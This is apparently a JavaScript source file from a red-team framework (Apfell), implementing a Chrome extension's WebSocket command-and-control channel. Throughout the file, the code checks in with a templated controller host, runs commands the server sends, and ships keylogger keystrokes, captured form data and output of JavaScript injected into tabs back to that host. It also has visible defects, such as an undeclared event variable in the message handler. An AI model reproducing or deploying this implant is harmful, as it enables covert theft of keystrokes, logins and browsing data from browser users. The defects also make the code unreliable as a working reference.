//------------- Chrome Extension Websocket C2 mechanisms ---------------------------------
// Dictionary that holds outbound messages
let out = [];
class customC2 extends baseC2{
    constructor(host, port, endpoint, ssl , interval){
        super(host, port, endpoint, ssl, interval);
        this.host = host;
        this.port = port;
        this.endpoint = endpoint;
        this.interval = interval;
        this.commands = {};

        if (ssl === true){
            this.proto = 'wss://';
        } else {
            this.proto = 'ws://';
        }

        this.server = `${this.proto}${this.host}${this.port}/${this.endpoint}`;
    }

    getConfig() {
        return JSON.stringify({'server': this.server, 'interval':this.interval, 'commands': this.commands.join(',')});
    }

    checkIn() {
        const localAddress = '127.0.0.1';
        const checkInMessage = CreateCallbackCheckInMessage(apfell.userinfo, apfell.uuid, 0, localAddress, 'chrome');
        const meta = {};
        meta["metatype"] = 2;
        meta["metadata"] = checkInMessage;
        const metaenvelope = JSON.stringify(meta);
        connection.send(metaenvelope);
        console.log('Sent initial checkin');
    }

    postResponse(){
        if (out.length > 0){
            // Pop and send a message to the controller
            const msg = out.shift();
            connection.send(msg);
        }
    }

    sendError(taskid, tasktype, err) {
        let payload = btoa(unescape(encodeURIComponent(JSON.stringify(err))));
        let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, payload.length, taskid, tasktype, payload);
        const meta = {};
        meta.type = 3;
        meta.metadata = envelope;
        const metaenvelope = JSON.stringify(meta);
        out.push(metaenvelope);
    }
}


/// Create a Callback Checkin Message
function CreateCallbackCheckInMessage(username, uuid, pid, addresses, hostname) {
    let msg = {};
    msg.user = username;
    msg.pid = pid;
    msg.uuid = uuid;
    msg.ip = addresses;
    msg.host = hostname;

    return msg;
}

function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data) {
    const msg = {};
    msg.type = type;
    msg.id = apfellID;
    msg.uuid = uuid;
    msg.size = size;
    msg.taskid = taskid;
    msg.tasktype = tasktype;
    msg.data =  data;

    return msg;
}

//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
const C2 = new customC2('HHHH',  PPPP, 'EEEE',  SSSS, IIII);
const connection  = new WebSocket(C2.server);

setInterval(function(){
    C2.postResponse();
}, C2.interval);

chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    // Listen for events from other scripts
    switch (message.type) {
        case 'keylogger' : {
            const keydata = {};
            keydata["user"] = config.username;
            keydata["keystrokes"] = message.data;
            keydata['window_title'] = message.window;
            let mtype = message.data.type;
            let payload = btoa(unescape(encodeURIComponent(JSON.stringify(keydata))));
            let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, mtype, payload);
            const meta = {};
            meta.type = 3;
            meta.metadata = envelope;
            const metaenvelope = JSON.stringify(meta);
            out.push(metaenvelope);
            break;
        }
        case 'formData' : {
            const formData = {};
            formData.user = config.username;
            formData.keystrokes = message.data;
            let mtype = message.data.type;
            let payload = btoa(unescape(encodeURIComponent(JSON.stringify(formData))));
            let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, mtype, payload);
            const meta = {};
            meta.type = 3;
            meta.metadata = envelope;
            const metaenvelope = JSON.stringify(meta);
            out.push(metaenvelope);
            break;
        }
        case 'custom': {
            // catch output from custom javascript injected into tabs
            let payload = btoa(unescape(encodeURIComponent(JSON.stringify(message.data))));
            let mtype = message.data.type;
            let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, mtype, payload);
            const meta = {};
            meta.type = 3;
            meta.metadata = envelope;
            const metaenvelope = JSON.stringify(meta);
            out.push(metaenvelope);
        }
    }
});

connection.onopen = function () {
    C2.checkIn();
};

connection.onclose = function () {
    // Do Nothing
};

connection.onerror = function () {
    // Do Nothing
};

connection.onmessage = function () {
    const message = JSON.parse(e.data);

    switch (message['metatype']) {
        case 2: {
            // callback check in
            const checkindata = message['metadata'];
            apfell.apfellid = checkindata['apfellid'];
            break;
        }
        case 3 : {
            // handle an apfell message
            const data = message["metadata"];
            const taskid = data["taskid"];
            const tasktype = data["tasktype"];

            try {
                C2.commands[tasktype](data['data']);
            } catch (err) {
                C2.sendError(taskid, tasktype, err);
            }
        }
    }
};